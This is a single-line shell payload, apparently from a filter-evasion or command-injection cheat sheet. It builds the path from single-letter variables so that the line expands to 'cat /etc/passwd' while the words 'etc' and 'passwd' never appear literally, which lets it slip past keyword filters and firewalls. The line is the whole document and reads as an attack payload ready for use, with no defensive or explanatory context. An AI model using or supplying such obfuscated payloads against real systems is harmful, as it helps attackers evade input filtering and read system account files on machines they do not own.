a=e; b=t; c=c; d=p; e=a; f=s; g=w; h=d; cat /$a$b$c/$d$e$f$f$g$h  

